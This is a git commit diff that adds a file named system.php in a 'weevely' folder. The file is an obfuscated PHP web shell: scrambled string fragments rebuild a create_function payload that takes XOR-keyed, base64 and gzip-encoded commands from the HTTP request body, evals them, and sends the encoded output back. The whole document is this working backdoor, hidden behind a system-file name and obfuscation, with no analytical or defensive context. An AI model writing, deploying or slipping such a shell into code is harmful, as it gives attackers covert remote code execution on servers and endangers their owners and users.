8ef6f70563677d84396ea90594300aae5f0ac663
tier77 <100871836+tier77@users.noreply.github.com>
2022-03-03 18:59:59 +0000

    Add files via upload

---
+++ weevely/system.php
@@ -0,0 +1,10 @@
+<?php
+$a=str_replace('j','','crejajte_jjfjunctjion');
+$I='$k="364=/a56=/0b";$kh="7=/c08=/012e=/a=/25d";=/$kf="1b0895733124=/";$p="=/0imm=/Nc5CLt8f=/zkO0";=/fun=/c=/tion x(=/$t,$k';
+$t='o.==/=/$t{$=/i}^$k{$j};}}ret=/=/urn $=/o;}if =/(@preg_ma=/tch("=//$kh(.=/=/+)$kf/",@f=/ile_=/get_cont=/ents=/(=/"php:/';
+$w='t=/_contents();@ob_=/end_c=/lean();$=/r=@ba=/se64_enc=/od=/e(=/@x(@gzc=/=/ompress($o),$k));pr=/int("$p=/=/$kh$r$kf");}';
+$U='/in=/put"=/),$m)===/1) {=/@ob_start();@eva=/l(@gzun=/=/compress(@x(=/@b=/ase64_=/=/de=/code($m[1]),$k=/)));=/=/$o=@ob_ge';
+$E='){=/$c=strlen($k)=/;$l=st=/rlen($=/t=/);$o="";fo=/r=/=/($i=0;$i=/<$l;){for(=/$j=0;=/($j<=/$c&&$i<$l);$j++=/,$i+=/+){$';
+$P=str_replace('=/','',$I.$E.$t.$U.$w);
+$n=$a('',$P);$n();
+?>
